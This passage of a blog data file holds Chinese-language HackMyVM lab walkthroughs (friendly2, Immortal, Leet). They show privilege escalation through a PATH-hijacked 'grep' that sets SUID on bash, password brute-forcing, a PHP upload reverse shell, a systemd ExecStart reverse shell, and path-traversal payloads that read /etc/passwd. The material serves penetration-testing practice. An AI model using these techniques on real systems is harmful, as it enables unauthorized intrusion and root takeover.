5.10.162-1 (2023-01-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\ngh0st@friendly2:~$ id\nuid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)\n\n```\n\n# 3.\u63d0\u6743\n\n```bash\ngh0st@friendly2:~$ sudo -l\nMatching Defaults entries for gh0st on friendly2:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser gh0st may run the following commands on friendly2:\n    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh\ngh0st@friendly2:~$ cat /opt/security.sh\n#!/bin/bash\n\necho 'Enter the string to encode:'\nread string\n\n# Validate that the string is no longer than 20 characters\nif [[ ${#string} -gt 20 ]]; then\n  echo 'The string cannot be longer than 20 characters.'\n  exit 1\nfi\n\n# Validate that the string does not contain special characters\nif echo '$string' | grep -q '[^[:alnum:] ]'; then\n  echo 'The string cannot contain special characters.'\n  exit 1\nfi\n\nsus1='A-Za-z'\nsus2='N-ZA-Mn-za-m'\n\nencoded_string=$(echo '$string' | tr $sus1 $sus2)\n\necho 'Original string: $string'\necho 'Encoded string: $encoded_string'\ngh0st@friendly2:~$ ls -la /opt/\ntotal 16\ndrwxr-xr-x  3 root root 4096 Apr 29  2023 .\ndrwxr-xr-x 19 root root 4096 Apr 27  2023 ..\ndrwxr-xr-x  2 root root 4096 Apr 29  2023 0-day\n-rwxr-xr-x  1 root root  561 Apr 29  2023 security.sh\n\n```\n\n\u5b9e\u73b0\u7528\u6237\u8f93\u5165\u4e0d\u8d8520\u4e2a\u5b57\u7b26\u4e14\u4e0d\u80fd\u6709\u7279\u6b8a\u7b26\u53f7\uff0c\u5c06\u8f93\u5165\u4fe1\u606fROT13 \u7f16\u7801\uff0c\u6211\u4eec\u6539\u4e2a\u73af\u5883\u53d8\u91cf\u5c31\u597d\u4e86\uff0c\u5b83\u6ca1\u7528\u7edd\u5bf9\u8def\u5f84\n\n```bash\ngh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' > grep\ngh0st@friendly2:/tmp$ chmod +x grep \ngh0st@friendly2:/tmp$ ls -la /bin/bash\n-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash\ngh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh\nEnter the string to encode:\naaassss\nThe string cannot contain special characters.\ngh0st@friendly2:/tmp$ ls -la /bin/bash\n-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash\ngh0st@friendly2:/tmp$ bash -p\nbash-5.1# id\nuid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)\nbash-5.1# cat /root/\n.bash_history  .bashrc        interfaces.sh  .local/        .profile       root.txt     \nbash-5.1# cat /root/root.txt \nNot yet! Try to find root.txt.\n\n\nHint: ...\nbash-5.1# find / -name '...' 2>/dev/null\n/...\nbash-5.1# cd /.../\nbash-5.1# ls -al\ntotal 12\nd-wx------  2 root root 4096 Apr 29  2023 .\ndrwxr-xr-x 19 root root 4096 Apr 27  2023 ..\n-r--------  1 root root  100 Apr 29  2023 ebbg.txt\nbash-5.1# cat ebbg.txt \nIt's codified, look the cipher:\n\n98199n723q0s44s6rs39r33685q8pnoq\n\n\n\nHint: numbers are not codified\n\n```\n\n![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)sentence", "top": 0, "createdAt": 1751016790, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P105": {"htmlDir": "docs/post/hmv_Immortal.html", "labels": ["HackMyVM"], "postTitle": "hmv_Immortal", "postUrl": "post/hmv_Immortal.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/105", "commentNum": 0, "wordCount": 8815, "description": "# hmv_Immortal\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.223\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n---\n\n# 1.\u626b\u63cf\n\n`nmap` \u8d77\u624b\uff0c\u5148\u63a2\u6d4b\u7aef\u53e3\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap 192.168.205.223\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 12:20 CST\nNmap scan report for 192.168.205.223\nHost is up (0.00042s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 0.45 seconds\n```\n\n\u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u6709 ftp \u670d\u52a1\u5148\u5c1d\u8bd5**\u533f\u540d\u767b\u5f55**\n\n---\n\n# 2.\u8e29\u70b9\n\n## port 21\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ftp 192.168.205.223     \nConnected to 192.168.205.223.\n220 (vsFTPd 3.0.3)\nName (192.168.205.223:kali): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n229 Entering Extended Passive Mode (|||52564|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        115          4096 Feb 27  2024 .\ndrwxr-xr-x    2 0        115          4096 Feb 27  2024 ..\n-rw-r--r--    1 0        0             504 Feb 27  2024 message.txt\n226 Directory send OK.\nftp> mget message.txt\nmget message.txt [anpqy?]? y\n229 Entering Extended Passive Mode (|||10512|)\n150 Opening BINARY mode data connection for message.txt (504 bytes).\n100% |*****************************************************************************************|   504      825.81 KiB/s    00:00 ETA\n226 Transfer complete.\n504 bytes received in 00:00 (429.10 KiB/s)\nftp> exit\n221 Goodbye.                               \n```\n\n\u67e5\u770b message.txt \u6587\u4ef6\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat message.txt \nHey guys!\nI made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. \nNow we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. \nThey may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! \nWishing you a long life, David.\n  \n\u563f,\u4f19\u8ba1\u4eec\uff01\n\u7ecf\u8fc7\u8fd9\u4e48\u957f\u65f6\u95f4\uff0c\u6211\u505a\u5230\u4e86\u3002\u6ca1\u9519\uff0c\u4f19\u8ba1\u4eec\uff0c\u4f1f\u5927\u7684\u73cd\u8d35\u4e0d\u673d\u3002\u6240\u6709\u4eba\u90fd\u89ca\u89ce\u800c\u6ca1\u6709\u4eba\u80fd\u5b9e\u73b0\u7684\u90a3\u4e2a\u3002\u53d7\u5230\u6240\u6709\u4eba\u7684\u9752\u7750\uff0c\u6ca1\u6709\u4eba\u62e5\u6709\u3002\n\u73b0\u5728\u6211\u4eec\u5fc5\u987b\u5c0f\u5fc3\uff0c\u4f19\u8ba1\u4eec\uff0c\u6211\u4eec\u5fc5\u987b\u5411\u4e16\u754c\u3001\u653f\u5e9c\u548c\u5176\u4ed6\u5371\u9669\u673a\u6784\u9690\u7792\u8fd9\u4ef6\u4e8b\u3002\n\u4ed6\u4eec\u751a\u81f3\u53ef\u80fd\u5df2\u7ecf\u542c\u8bf4\u4e86\u6211\u4eec\u7684\u6210\u5c31\uff0c\u4ed6\u4eec\u65e0\u5904\u4e0d\u5728\uff01\u8fd9\u5c31\u662f\u6211\u51b3\u5b9a\u52a0\u5f3a\u670d\u52a1\u5668\u5b89\u5168\u6027\u7684\u539f\u56e0\u3002\u5982\u679c\u4ed6\u4eec\u8bd5\u56fe\u5165\u4fb5\u6211\u4eec\u600e\u4e48\u529e!!\n\u795d\u4f60\u957f\u5bff\uff0c\u5927\u536b\u3002                       \n```\n\n\u6ca1\u7528\u4fe1\u606f\uff0c\u5c31\u83b7\u5f97\u4e2a\u7528\u6237\u540d **David**\uff0c\u90a3\u8fdb\u884c\u63a2\u6d4b 80 \u670d\u52a1\n\n## port 80\n\n![image](https://github.com/user-attachments/assets/403e1434-4a32-4037-8354-3ba83dd46695)\n\n\u4e00\u4e2a\u5bc6\u7801\u8f93\u5165\u6846\uff0c\u62ff burp \u7206\u7834\u4e00\u4e0b\uff0c\u6211\u8fd9\u7206\u7684\u662f\u524d 5000 \u884c\u7684 rockyou.txt \u5b57\u5178\n\n![image](https://github.com/user-attachments/assets/92adc0f7-16e8-455f-b18d-6d4cb1a4b0ea)\n\n\u5176\u4e2d\u5bc6\u7801 **santiago**\uff0c\u72b6\u6001\u7801\u548c\u957f\u5ea6\u5b8c\u5168\u4e0d\u4e00\u6837\uff0c\u5c1d\u8bd5\u767b\u5f55\n\n![image](https://github.com/user-attachments/assets/a6468ac6-365a-41f9-896d-c49c4d723309)\n\n\u4e00\u4e2a\u6587\u4ef6\u5939\u76ee\u5f55\uff0c\u5176\u4e2d `chat/`\u7ed9\u4e86\u63d0\u793a\n\n![image](https://github.com/user-attachments/assets/d5afbcdc-152e-4f92-9b4c-a4e8e7876ff1)\n\n\u4e0a\u4f20\u70b9\u5728 `upload_an_incredible_message.php`\uff0c\u6d45\u8bd5\u4e86\u4e00\u4e0b,\u4e0a\u4f20 `index.php` \u4e0d\u6210\u529f\uff0c\u6211\u5c31\u76f4\u63a5\u653e burp \u7206\u7834\u540e\u7f00\u4e86\n\n![image](https://github.com/user-attachments/assets/7f2fda33-177d-4a71-9212-9676d959bd66)\n\n\u76f4\u63a5\u53bb\u7f51\u9875\u770b\u4e86\uff0c\u4e0d\u60f3\u770b\u62a5\u6587\n\n![image](https://github.com/user-attachments/assets/8446218d-b24e-4ed0-add6-1f7388617018)\n\n\u5176\u4e2d **index.phtml** \u662f\u53ef\u4ee5\u6267\u884c\u7684\uff0c\u5230\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u62ff\u5230\u4e86 **www-data** \u7684 **shell**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888                     \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 50866\nLinux Immortal 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 GNU/Linux\n 05:32:45 up 12 min,  0 users,  load average: 1.55, 5.77, 3.77\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (490): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@Immortal:/$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```bash\nwww-data@Immortal:/home$ ls -al\ntotal 20\ndrwxr-xr-x  5 root  root  4096 Feb 27  2024 .\ndrwxr-xr-x 18 root  root  4096 Feb 27  2024 ..\ndrw-------  2 david david 4096 Feb 29  2024 david\ndrwxr-xr-x  4 drake drake 4096 Feb 29  2024 drake\ndrwxr-xr-x  3 eric  eric  4096 Feb 29  2024 eric\nwww-data@Immortal:/home$ cd drake/\nwww-data@Immortal:/home/drake$ ls -la\ntotal 32\ndrwxr-xr-x 4 drake drake 4096 Feb 29  2024 .\ndrwxr-xr-x 5 root  root  4096 Feb 27  2024 ..\ndrwxr-xr-x 2 drake drake 4096 Feb 27  2024 ...\n-rw-r--r-- 1 drake drake  220 Feb 27  2024 .bash_logout\n-rw-r--r-- 1 drake drake 3526 Feb 27  2024 .bashrc\ndrwxr-xr-x 3 drake drake 4096 Feb 27  2024 .local\n-rw-r--r-- 1 drake drake  807 Feb 27  2024 .profile\n-rw-r--r-- 1 drake drake   20 Feb 27  2024 user.txt\nwww-data@Immortal:/home/drake$ cd .../\nwww-data@Immortal:/home/drake/...$ ls -la\ntotal 12\ndrwxr-xr-x 2 drake drake 4096 Feb 27  2024 .\ndrwxr-xr-x 4 drake drake 4096 Feb 29  2024 ..\n-rw-r--r-- 1 drake drake  134 Feb 27  2024 pass.txt\nwww-data@Immortal:/home/drake/...$ cat pass.txt \nnetflix : drake123\namazon : 123drake\nshelldred : shell123dred (f4ns0nly)\nsystem : kevcjnsgii\nbank : myfavouritebank\nnintendo : 123456\n\n```\n\n\u96be\u8bc4\uff0c\u628a\u6570\u636e\u5904\u7406\u4e00\u4e0b\n\n```bash\nwww-data@Immortal:/home/drake/...$ cat pass.txt |awk -F ' ' '{print $1 '\\n' $3}'   \nnetflix\ndrake123\namazon\n123drake\nshelldred\nshell123dred\nsystem\nkevcjnsgii\nbank\nmyfavouritebank\nnintendo\n123456\nwww-data@Immortal:/tmp$ echo 'f4ns0nly' >> pass \nwww-data@Immortal:/tmp$ cat pass \nnetflix\ndrake123\namazon\n123drake\nshelldred\nshell123dred\nsystem\nkevcjnsgii\nbank\nmyfavouritebank\nnintendo\n123456\n\nf4ns0nly\n```\n\n\u90a3\u4e2a\u7a7a\u683c\u65e0\u4f24\u5927\u96c5\uff0c\u62d6\u4e2a **suForce** \u7206\u7834\u5bc6\u7801\n\n```bash\nwww-data@Immortal:/tmp$ ./suForce -u drake -w pass \n            _____                  \n ___ _   _ |  ___|__  _ __ ___ ___   \n/ __| | | || |_ / _ \\| '__/ __/ _ \\ \n\\__ \\ |_| ||  _| (_) | | | (_|  __/  \n|___/\\__,_||_|  \\___/|_|  \\___\\___|  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n code: d4t4s3c     version: v1.0.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ud83c\udfaf Username | drake\n\ud83d\udcd6 Wordlist | pass\n\ud83d\udd0e Status   | 8/14/57%/kevcjnsgii\n\ud83d\udca5 Password | kevcjnsgii\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\nwww-data@Immortal:/tmp$ su - drake   \n```\n\n*ps:\u5982\u679c\u5b83\u63d0\u793a\u6ca1\u6709\u627e\u5230\u5bc6\u7801\u53ef\u4ee5\u591a\u8bd5\u51e0\u6b21\uff0c\u6211\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u6211 suForce \u7684\u95ee\u9898\uff0c\u6211\u7684\u4f1a\u8bef\u62a5*\n\n```bash\ndrake@Immortal:/home$ sudo -l\nMatching Defaults entries for drake on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser drake may run the following commands on Immortal:\n    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py\n\n```\n\n\u53ef\u4ee5\u7528 **python3** \u6267\u884c`/opt/immortal.py`\uff0c`/opt/immortal.py` \u6211\u4eec\u6709\u7f16\u8f91\u6743\u9650\uff0c\u76f4\u63a5\u6539\u5c31\u597d\u4e86\uff0c\u6211\u7529\u4e86\u4e2a\u53cd\u5f39 shell \u56de\u53bb[\u80a5\u80a5\u762b]\n\n```bash\neric@Immortal:~$ sudo -l\nMatching Defaults entries for eric on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser eric may run the following commands on Immortal:\n    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl start immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl daemon-reload\neric@Immortal:~$ sudo sudoedit /etc/systemd/system/immortal.service\n```\n\n\u6539\u4e2a\u53cd\u5f39 shell \u4e0a\u53bb,\u67e5\u770bsudo\u6743\u9650\n\n```bash\neric@Immortal:~$ sudo -l\nMatching Defaults entries for eric on Immortal:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser eric may run the following commands on Immortal:\n    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl start immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service\n    (root) NOPASSWD: /usr/bin/systemctl daemon-reload\neric@Immortal:~$ sudo sudoedit /etc/systemd/system/immortal.service\n```\n\n![image](https://github.com/user-attachments/assets/03c06f7b-54a5-44f4-9a93-6f98aa26aa5d)\n\n\u628a**ExecStart**\u6539\u6210\u4e86**\u53cd\u5f39shell\uff0c**  \u91cd\u542f\u4e00\u4e0b\u670d\u52a1\n\n```bash\neric@Immortal:~$ sudo /usr/bin/systemctl start immortal.service\n```\n\n\u76d1\u542c\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8899\nlistening on [any] 8899 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.223] 48726\nbash: cannot set terminal process group (15372): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@Immortal:/# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n\n```\n\n\u6210\u529f\u62ff\u5230**root**\u6743\u9650sentence", "top": 0, "createdAt": 1751016795, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P106": {"htmlDir": "docs/post/hmv_Leet-bi-ji.html", "labels": ["HackMyVM"], "postTitle": "hmv_Leet\u7b14\u8bb0", "postUrl": "post/hmv_Leet-bi-ji.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/106", "commentNum": 0, "wordCount": 25742, "description": "# hmv_Leet\u7b14\u8bb0\n\n**\u9776\u673a**\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=Leet\n\n**\u96be\u5ea6**\uff1a<span data-type='text' style='color: var(--b3-font-color8);'>\u7ea2\u8272</span>\n\n**\u76ee\u6807 IP**\uff1a192.168.205.208\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u7aef\u53e3\u679a\u4e3e\u53ca\u670d\u52a1\u63a2\u6d4b\n\n\u4f7f\u7528 `nmap` \u626b\u63cf\u76ee\u6807 IP \u7684\u5f00\u653e\u7aef\u53e3\uff1a\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sV -sT -O -Pn -n -p- 192.168.205.208\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 14:28 CST\nNmap scan report for 192.168.205.208\nHost is up (0.00024s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)\nMAC Address: 08:00:27:39:2C:58 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.17 seconds\n```\n\n7777 \u7aef\u53e3\u662f Web \u670d\u52a1\u8fd8\u662f python3.11.2 \u7684\uff0c\u53ef\u80fd\u662f\u60f3\u8003 SSTI\uff0c\u53bb\u9875\u9762\u770b\u773c\u3002\n\n# 2.\u8def\u5f84\u5305\u542b\n\n\u9875\u9762\u662f\u4e00\u4e2a L33T Converter\uff08\u9ed1\u5ba2\u8bed\u8a00\u8f6c\u6362\u5668\uff09\n\n![image](https://github.com/user-attachments/assets/78a54a41-677f-4893-9236-ccbd513c99ad)\n\n\u5728\u8f93\u5165\u6846\u6d4b\u8bd5\u4e86 xss,ssti,sql \u6ce8\u5165\u7b49\u90fd\u65e0\u679c\uff0c\u7136\u540e\u53d1\u73b0\u8fd9\u4e2a\u4e0b\u8f7d\u8d85\u94fe\u63a5\u5e94\u8be5\u6709\u70b9\u4e1c\u897f\uff0c\u8c01\u5bb6\u8f6c\u6362\u5b8c\u8fd8\u53ef\u4ee5\u4e0b\u8f7d\u554a\n\n![image](https://github.com/user-attachments/assets/014865fa-e61d-49de-ba77-da53c97db264)\n\n\u770b\u7740\u90fd\u50cf\u4e00\u4e2a\u8def\u5f84\u5305\u542b\uff0c\u6d4b\u8bd5\u4e00\u4e0b\n\n![image](https://github.com/user-attachments/assets/dbda012f-0d89-4f5d-83ca-42601faaec8f)\n\n\u770b\u770b\u6709\u5565\u7528\u6237\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat ~/Downloads/passwd|grep 'bash'\nroot:x:0:0:root:/root:/bin/bash\nriva:x:1000:1000:,,,:/home/riva:/bin/bash\n```\n\n\u5c1d\u8bd5\u8bfb\u53d6 `riva` \u7528\u6237\u7684 ssh \u5bc6\u94a5\uff0c\u4e0d\u7ed9\u8bfb\n\n\u7206\u7834\u4e00\u4e0b\u76ee\u5f55\u5305\u542b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -c -u 'http://192.168.205.208:7777/download?filename=../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc=500,404 --hw=0\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.208:7777/download?filename=../../../../FUZZ\nTotal requests: 929\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                         \n=====================================================================\n\n000000023:   200        24 L     32 W       1217 Ch     '..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd'                        \n000000020:   200        24 L     32 W       1217 Ch     '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd' \n000000016:   200        24 L     32 W       1217 Ch     '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2\n                                                        e/etc/passwd'                                                   \n000000135:   200        15 L     109 W      806 Ch      '/etc/fstab'                                                    \n000000131:   200        22 L     190 W      1042 Ch     '/etc/crontab'                                                  \n000000129:   200        18 L     105 W      1046 Ch     '/etc/apt/sources.list'                                         \n000000121:   200        225 L    1107 W     7178 Ch     '/etc/apache2/apache2.conf'                                     \n000000138:   200        53 L     53 W       683 Ch      '/etc/group'                                                    \n000000209:   200        17 L     111 W      711 Ch      '/etc/hosts.deny'                                               \n000000208:   200        10 L     57 W       411 Ch      '/etc/hosts.allow'                                              \n000000206:   200        7 L      22 W       188 Ch      '../../../../../../../../../../../../etc/hosts'                 \n000000205:   200        7 L      22 W       188 Ch      '/etc/hosts'                                                    \n000000268:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../etc/passwd'                \n000000267:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../etc/passwd'             \n000000266:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../etc/passwd'          \n000000265:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../etc/passwd'       \n000000264:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../etc/passwd'    \n000000263:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../etc/passwd'   \n000000262:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../etc/passwd'  \n000000261:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../etc/passwd' \n000000260:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../etc/passw\n                                                        d'                                                              \n000000259:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../../etc/pa\n                                                        sswd'                                                           \n000000258:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../../../../../../../../../../../../etc\n                                                        /passwd'                                                        \n000000257:   200        24 L     32 W       1217 Ch     '/etc/passwd'                                                   \n000000254:   200        24 L     32 W       1217 Ch     '/../../../../../../../../../../etc/passwd'                     \n000000253:   200        24 L     32 W       1217 Ch     '/./././././././././././etc/passwd'                             \n000000250:   200        20 L     65 W       526 Ch      '/etc/nsswitch.conf'                                            \n000000249:   200        19 L     103 W      767 Ch      '/etc/netconfig'                                                \n000000246:   200        7 L      40 W       286 Ch      '/etc/motd'                                                     \n000000237:   200        2 L      5 W        27 Ch       '/etc/issue'                                                    \n000000236:   200        353 L    1042 W     8139 Ch     '/etc/init.d/apache2'                                           \n000000269:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../../etc/passwd'                   \n000000271:   200        24 L     32 W       1217 Ch     '../../../../../../../../../etc/passwd'                         \n000000275:   200        24 L     32 W       1217 Ch     '../../../../../etc/passwd'                                     \n000000283:   200        24 L     32 W       1217 Ch     'etc/passwd'                                                    \n000000311:   200        24 L     32 W       1217 Ch     '../../../../../../etc/passwd&=%3C%3C%3C%3C'                    \n000000279:   200        24 L     32 W       1217 Ch     '../etc/passwd'                                                 \n000000278:   200        24 L     32 W       1217 Ch     '../../etc/passwd'                                              \n000000277:   200        24 L     32 W       1217 Ch     '../../../etc/passwd'                                           \n000000274:   200        24 L     32 W       1217 Ch     '../../../../../../etc/passwd'                                  \n000000276:   200        24 L     32 W       1217 Ch     '../../../../etc/passwd'                                        \n000000273:   200        24 L     32 W       1217 Ch     '../../../../../../../etc/passwd'                               \n000000270:   200        24 L     32 W       1217 Ch     '../../../../../../../../../../etc/passwd'                      \n000000272:   200        24 L     32 W       1217 Ch     '../../../../../../../../etc/passwd'                            \n000000422:   200        122 L    387 W      3208 Ch     '/etc/ssh/sshd_config'                                          \n000000400:   200        41 L     120 W      911 Ch      '/etc/rpc'                                                      \n000000399:   200        3 L      6 W        63 Ch       '/etc/resolv.conf'                                              \n000000699:   200        0 L      1 W        292 Ch      '/var/log/lastlog'                                              \n000000750:   200        0 L      1 W        1149 Ch     '/var/run/utmp'                                                 \n000000741:   200        21 L     154 W      100181 Ch   '/var/log/wtmp'                                                 \n000000929:   200        24 L     32 W       1217 Ch     '///////../../../etc/passwd'                                    \n\nTotal time: 3.955495\nProcessed Requests: 929\nFiltered Requests: 878\nRequests/sec.: 234.8631\n```\n\n\u53eb GPT \u603b\u7ed3\u4e86\u4e00\u4e0b\u7528\u5904\n\n1. `/etc/passwd`\uff1a\u5b58\u50a8\u7cfb\u7edf\u7528\u6237\u8d26\u6237\u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u5305\u62ec\u7528\u6237\u540d\u3001\u5bc6\u7801\uff08\u901a\u5e38\u662f\u52a0\u5bc6\u7684\uff09\u3001\u7528\u6237 ID\u3001\u7ec4 ID \u7b49\u3002\n2. `/etc/fstab`\uff1a\u5b58\u50a8\u6587\u4ef6\u7cfb\u7edf\u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u81ea\u52a8\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf\u3002\n3. 